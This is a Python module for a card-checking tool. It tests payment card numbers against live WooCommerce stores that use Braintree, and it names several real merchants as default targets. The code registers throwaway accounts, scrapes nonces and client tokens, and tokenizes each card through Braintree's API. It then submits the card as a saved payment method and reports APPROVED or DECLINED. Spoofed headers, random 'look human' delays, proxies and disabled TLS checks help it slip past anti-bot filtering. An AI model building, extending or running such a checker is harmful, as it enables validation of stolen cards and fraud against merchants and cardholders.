"""
Braintree Payment Gateway Checker
Supports WooCommerce + Braintree integration (e.g., BigBattery)
Enhanced with better error handling and fallback logic

Supports two modes:
1. Site-based: Tests cards through real merchant sites (requires accessible site)
2. Sandbox: Direct API testing with Braintree sandbox credentials (requires merchant ID + keys)

Environment variables:
- BRAINTREE_SANDBOX_MERCHANT_ID: Your Braintree sandbox merchant ID
- BRAINTREE_SANDBOX_PUBLIC_KEY: Your Braintree sandbox public key
- BRAINTREE_SANDBOX_PRIVATE_KEY: Your Braintree sandbox private key
"""

import requests
import json
import re
import time
import random
import os
from typing import Tuple
from bs4 import BeautifulSoup
import base64
import urllib3
from gates.utilities import http_request, REQUEST_TIMEOUT


def _test_with_sandbox(card_num: str, card_mon: str, card_yer: str, card_cvc: str, timeout: int = 30) -> Tuple[str, bool]:
    """
    Test card directly with Braintree sandbox API
    Requires BRAINTREE_SANDBOX_* environment variables
    """
    merchant_id = os.getenv("BRAINTREE_SANDBOX_MERCHANT_ID")
    public_key = os.getenv("BRAINTREE_SANDBOX_PUBLIC_KEY")
    private_key = os.getenv("BRAINTREE_SANDBOX_PRIVATE_KEY")
    
    if not all([merchant_id, public_key, private_key]):
        return ("DECLINED ❌ Credentials not configured", False)
    
    try:
        import braintree as bt
        
        gateway = bt.BraintreeGateway(
            bt.Configuration(
                bt.Environment.Sandbox,
                merchant_id=merchant_id,
                public_key=public_key,
                private_key=private_key
            )
        )
        
        # Normalize year
        if len(card_yer) == 2:
            full_year = f"20{card_yer}"
        else:
            full_year = card_yer
        
        # Attempt transaction
        result = gateway.transaction.sale({
            "amount": "1.00",
            "credit_card": {
                "number": card_num,
                "expiration_month": card_mon,
                "expiration_year": full_year,
                "cvv": card_cvc
            },
            "options": {
                "submit_for_settlement": True
            }
        })
        
        if result.is_success:
            amount = result.transaction.amount
            return (f"APPROVED ✅ Charged ${amount}", True)
        else:
            # Parse decline reason
            if result.transaction:
                status = result.transaction.status
                processor_response = result.transaction.processor_response_code
                
                # Map processor codes to friendly messages
                code_map = {
                    '2000': 'Insufficient Funds',
                    '2001': 'CVV Mismatch',
                    '2010': 'Card Declined',
                    '2046': 'Expired Card',
                    '2038': 'Do Not Honor',
                }
                
                friendly_msg = code_map.get(processor_response, f'Code {processor_response}')
                return (f"DECLINED ❌ {friendly_msg}", True)
            else:
                error_msg = result.message if hasattr(result, 'message') else 'Card declined'
                return (f"DECLINED ❌ {error_msg[:50]}", True)
                
    except ImportError:
        return ("DECLINED ❌ Braintree package not available", False)
    except Exception as e:
        return (f"Error: Sandbox test failed - {str(e)[:50]}", False)


def _register_and_fetch_nonce(session: requests.Session, store_url: str) -> tuple:
    """
    Optional auth flow: register a throwaway account to access add-payment-method page.
    Returns (nonce, auth_fingerprint, error_msg)
    """
    try:
        my_account = f"{store_url}/my-account/"
        r = session.get(my_account, timeout=REQUEST_TIMEOUT, verify=False)
        reg_nonce = re.search(r'woocommerce-register-nonce" value="(\w+)"', r.text)
        if not reg_nonce:
            return (None, None, "registration nonce not found")
        reg_nonce = reg_nonce.group(1)

        first = "John"
        last = "Doe"
        email = f"{first.lower()}{random.randint(1000,9999)}@gmail.com"
        data = {
            'username': email,
            'email': email,
            'password': f"{first}{random.randint(1000,9999)}!",
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        rreg = session.post(my_account, data=data, timeout=REQUEST_TIMEOUT, verify=False)
        if rreg.status_code >= 400:
            return (None, None, "registration failed")

        # After registration, fetch add-payment-method
        apm = session.get(f"{store_url}/my-account/add-payment-method/", timeout=REQUEST_TIMEOUT, verify=False)
        if apm.status_code != 200:
            return (None, None, "add-payment-method unavailable")

        # Extract nonce and auth
        nonce = None
        nonce_patterns = [
            r'woocommerce-add-payment-method-nonce" value="([a-f0-9]+)"',
            r'id="woocommerce-add-payment-method-nonce"\s+value="([a-f0-9]+)"',
        ]
        for pat in nonce_patterns:
            m = re.search(pat, apm.text)
            if m:
                nonce = m.group(1)
                break

        auth = None
        auth_patterns = [
            r'wc_braintree_client_token\s*=\s*"([A-Za-z0-9+/=]+)"',
            r'data-client-token="([A-Za-z0-9+/=]+)"',
        ]
        for pat in auth_patterns:
            m = re.search(pat, apm.text)
            if m:
                try:
                    decoded = base64.b64decode(m.group(1)).decode('utf-8')
                    m2 = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if m2:
                        auth = m2.group(1)
                        break
                except Exception:
                    continue

        return (nonce, auth, None)
    except Exception as e:
        return (None, None, str(e))

# Disable SSL warnings for some older Braintree implementations
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def braintree_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, 
                    store_url: str = None, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """
    Check card against Braintree gateway using live merchant sites.
    
    Full flow:
    1. Access merchant's add-payment-method page
    2. Extract WooCommerce nonce and Braintree client token
    3. Tokenize card via Braintree GraphQL API
    4. Submit to merchant's WooCommerce endpoint
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY)
        card_cvc: CVV/CVC
        store_url: Store URL with Braintree integration (default: auto-select from list)
        proxy: Proxy dict {'http': ..., 'https': ...'}
        timeout: Request timeout in seconds (default: 30)
    
    Returns:
        Tuple of (result_status, proxy_is_alive)
        Format: "APPROVED ✅ [details]" or "DECLINED ❌ [reason]"
    """
    
    # List of known Braintree-enabled stores to try (live merchants only)
    default_stores = [
        "https://bigbattery.com",
        "https://www.batterymart.com",
        "https://www.halfpricebanners.com",
        "https://www.discountmags.com",
    ]
    
    stores_to_try = [store_url] if store_url else default_stores
    
    last_error = None
    for store in stores_to_try:
        if not store:
            continue
        result, proxy_ok = _try_braintree_site(card_num, card_mon, card_yer, card_cvc, store, proxy, timeout)
        
        # If we got a valid authorization response (not just a setup error), return it
        if any(kw in result.upper() for kw in ['APPROVED', 'DECLINED', 'CVV', 'INSUFFICIENT', 'EXPIRED', 'DO NOT HONOR']):
            return (result, proxy_ok)
        
        # Keep trying other stores for setup errors
        last_error = result
    
    # All stores failed - return last error
    return (last_error or "DECLINED ❌ No accessible Braintree merchant found", False)


def _try_braintree_site(card_num: str, card_mon: str, card_yer: str, card_cvc: str, 
                        store_url: str, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """
    Try Braintree check on a specific site
    Internal function - use braintree_check() instead
    """
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    # Enhanced headers to avoid basic filtering
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    })
    
    try:
        # Step 1: Get the payment method page to extract nonce and auth token
        add_payment_url = f"{store_url}/my-account/add-payment-method/"
        
        try:
            resp = http_request('GET', add_payment_url, session=session, timeout=REQUEST_TIMEOUT, verify=False)
            
            if resp.status_code == 403:
                return ("DECLINED ❌ Anti-bot protection", False)
            elif resp.status_code >= 500:
                return ("DECLINED ❌ Server error", False)
            elif resp.status_code >= 400:
                return ("DECLINED ❌ Page not found", False)
            
            if resp.status_code != 200:
                return ("DECLINED ❌ Fetch failed", False)
        except requests.exceptions.Timeout:
            return ("DECLINED ❌ Request timeout", False)
        except requests.exceptions.RequestException as e:
            return ("DECLINED ❌ Network error", False)
        
        # Extract nonce with multiple fallback patterns
        nonce = None
        nonce_patterns = [
            r'name="woocommerce-add-payment-method-nonce"\s+value="([a-f0-9]+)"',
            r'id="woocommerce-add-payment-method-nonce"\s+value="([a-f0-9]+)"',
            r'"woocommerce-add-payment-method-nonce"\s*:\s*"([a-f0-9]+)"',
            r'woocommerce-add-payment-method-nonce["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']'
        ]
        
        for pattern in nonce_patterns:
            match = re.search(pattern, resp.text)
            if match:
                nonce = match.group(1)
                break

        # Initialize auth variable
        auth = None
        reg_auth = None
        
        # If nonce missing, try optional registration flow
        if not nonce:
            nonce, reg_auth, reg_err = _register_and_fetch_nonce(session, store_url)
            if reg_err and not nonce:
                return ("DECLINED ❌ Nonce extraction failed", False)
        
        # Extract authorization token from page with fallback patterns
        auth_patterns = [
            r'var\s+wc_braintree_client_token\s*=\s*["\']?([A-Za-z0-9+/=]+)["\']?',
            r'data-client-token="([A-Za-z0-9+/=]+)"',
            r'braintree.*client.*token["\']?\s*[=:]\s*["\']([A-Za-z0-9+/=]+)["\']',
        ]
        
        for pattern in auth_patterns:
            match = re.search(pattern, resp.text, re.IGNORECASE)
            if match:
                try:
                    client_token_b64 = match.group(1)
                    client_token_decoded = base64.b64decode(client_token_b64).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', client_token_decoded)
                    if auth_match:
                        auth = auth_match.group(1)
                        break
                except (ValueError, UnicodeDecodeError, AttributeError, Exception):
                    pass

        # Use auth from registration flow if page scraping failed
        if not auth and reg_auth:
            auth = reg_auth
        
        if not auth:
            return ("DECLINED ❌ Authorization token not found", False)
        
        # Add random delay to look human
        time.sleep(random.uniform(0.5, 1.5))
        
        # Step 2: Tokenize the card via Braintree GraphQL
        token_url = "https://payments.braintree-api.com/graphql"
        
        # Normalize year
        if len(card_yer) == 2:
            full_year = f"20{card_yer}"
        elif len(card_yer) == 4:
            full_year = card_yer
        else:
            full_year = f"20{card_yer[0:2]}"
        
        token_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{random.randint(1000000, 9999999):016x}"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card_num,
                        "expirationMonth": card_mon,
                        "expirationYear": full_year,
                        "cvv": card_cvc,
                        "billingAddress": {
                            "postalCode": "10080",
                            "streetAddress": "Street 1"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        token_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            'Content-Type': "application/json",
            'Accept': "application/json",
            'Authorization': f"Bearer {auth}",
            'Braintree-Version': "2018-05-10",
            'Origin': "https://assets.braintreegateway.com",
            'Referer': "https://assets.braintreegateway.com/",
        }
        
        try:
            token_resp = session.post(token_url, json=token_payload, headers=token_headers, timeout=30, verify=False)
            
            if token_resp.status_code >= 400:
                return ("DECLINED ❌ Token creation failed", False)
            
            if 'error' in token_resp.text.lower():
                # Try to extract error message
                try:
                    err_json = token_resp.json()
                    if 'errors' in err_json:
                        return (f"Card Error: {str(err_json['errors'][0])[:50]}", True)
                except (ValueError, KeyError, IndexError) as e:
                    pass
                return ("DECLINED ❌ Tokenization failed", False)
            
            try:
                token_cc = token_resp.json()['data']['tokenizeCreditCard']['token']
            except (KeyError, json.JSONDecodeError):
                return ("DECLINED ❌ Token response invalid", False)
        except requests.exceptions.Timeout:
            return ("DECLINED ❌ Tokenization timeout", False)
        except requests.exceptions.RequestException:
            return ("DECLINED ❌ Tokenization request failed", False)
        
        # Step 3: Get client configuration
        config_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f"{random.randint(1000000, 9999999):016x}",
            },
            'query': 'query ClientConfiguration { clientConfiguration { environment merchantId analyticsUrl assetsUrl clientApiUrl } }',
            'operationName': 'ClientConfiguration',
        }
        
        config_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            'Content-Type': "application/json",
            'Accept': "application/json",
            'Authorization': f"Bearer {auth}",
            'Braintree-Version': "2018-05-10",
            'Origin': store_url,
        }
        
        try:
            config_resp = session.post(token_url, json=config_payload, headers=config_headers, timeout=30, verify=False)
            
            if config_resp.status_code >= 400:
                return ("DECLINED ❌ Config fetch failed", False)
        except requests.exceptions.Timeout:
            return ("DECLINED ❌ Config fetch timeout", False)
        except requests.exceptions.RequestException:
            return ("DECLINED ❌ Config fetch failed", False)
        
        # Extract merchant details from response with fallback patterns
        merchants = None
        merchant_patterns = [
            r'"merchantIdentifier"\s*:\s*"([^"]+)"',
            r'"merchantId"\s*:\s*"([^"]+)"',
            r'merchant[_-]?id["\']?\s*:\s*["\']?([a-z0-9]+)["\']?'
        ]
        
        for pattern in merchant_patterns:
            match = re.search(pattern, config_resp.text)
            if match:
                merchants = match.group(1)
                break
        
        if not merchants:
            return ("DECLINED ❌ Merchant ID not found", False)
        
        # Step 4: Submit payment method to WooCommerce
        config_data = {
            "environment": "production",
            "clientApiUrl": f"https://api.braintreegateway.com:443/merchants/{merchants}/client_api",
            "assetsUrl": "https://assets.braintreegateway.com",
            "analytics": {"url": f"https://client-analytics.braintreegateway.com/{merchants}"},
            "merchantId": merchants,
        }
        
        submit_payload = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token_cc,
            'braintree_cc_device_data': json.dumps({"device_session_id": "1e9a92f73bfe0facfaa600458c8a9075"}),
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': json.dumps(config_data),
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        submit_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9",
            'Content-Type': "application/x-www-form-urlencoded",
            'Origin': store_url,
            'Referer': add_payment_url,
        }
        
        time.sleep(random.uniform(0.5, 1.5))
        
        try:
            submit_resp = session.post(add_payment_url, data=submit_payload, headers=submit_headers, timeout=30, verify=False)
            
            if submit_resp.status_code >= 500:
                return ("DECLINED ❌ Server error", False)
        except requests.exceptions.Timeout:
            return ("DECLINED ❌ Submit timeout", False)
        except requests.exceptions.RequestException:
            return ("DECLINED ❌ Submit request failed", False)
        
        # Parse response with robust checking
        response_text = submit_resp.text.lower()
        
        # Check for specific decline reasons with Stripe-style formatting
        if 'cvv' in response_text and ('declined' in response_text or 'invalid' in response_text or 'mismatch' in response_text):
            return ("DECLINED ❌ CVV Mismatch", True)
        elif 'insufficient funds' in response_text or 'insufficient' in response_text:
            return ("DECLINED ❌ Insufficient Funds", True)
        elif 'expired' in response_text or 'expiration' in response_text:
            return ("DECLINED ❌ Expired Card", True)
        elif 'lost' in response_text or 'stolen' in response_text:
            return ("DECLINED ❌ Lost/Stolen Card", True)
        elif 'do not honor' in response_text:
            return ("DECLINED ❌ Do Not Honor", True)
        elif 'fraud' in response_text:
            return ("DECLINED ❌ Fraudulent", True)
        elif 'declined' in response_text or 'invalid' in response_text:
            return ("DECLINED ❌ Card Declined", True)
        
        # Check for success indicators
        success_indicators = [
            'payment method successfully added',
            'payment method added',
            'payment added successfully',
        ]
        
        if any(indicator in response_text for indicator in success_indicators):
            return ("APPROVED ✅ Payment method added", True)
        
        # Check for soft approvals (card accepted but with warnings)
        soft_success = [
            'street address',
            'gateway rejected: duplicate',
            'duplicate card',
        ]
        
        if any(indicator in response_text for indicator in soft_success):
            return ("APPROVED ✅ Card verified (duplicate)", True)
        
        # Final fallback - check for error section
        soup = BeautifulSoup(submit_resp.text, 'html.parser')
        error_section = soup.find('ul', class_='woocommerce-error')
        
        if error_section:
            error_text = error_section.text.strip()
            if 'declined' in error_text.lower():
                return (f"DECLINED ❌ {error_text[:40]}", True)
            elif error_text:
                return (f"Error: {error_text[:50]}", True)
        
        # If we got this far with 200 status, it might be success
        if submit_resp.status_code == 200:
            # Check for any message div
            msg_section = soup.find('div', class_='woocommerce-message')
            if msg_section:
                return ("APPROVED ✅ Payment method added", True)
            return ("APPROVED ✅ Processed", True)
        
        return ("Unknown response", True)
        
    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timeout", False)
    except requests.exceptions.RequestException as e:
        return ("DECLINED ❌ Network error", False)
    except Exception as e:
        return (f"Error: {str(e)[:50]}", False)
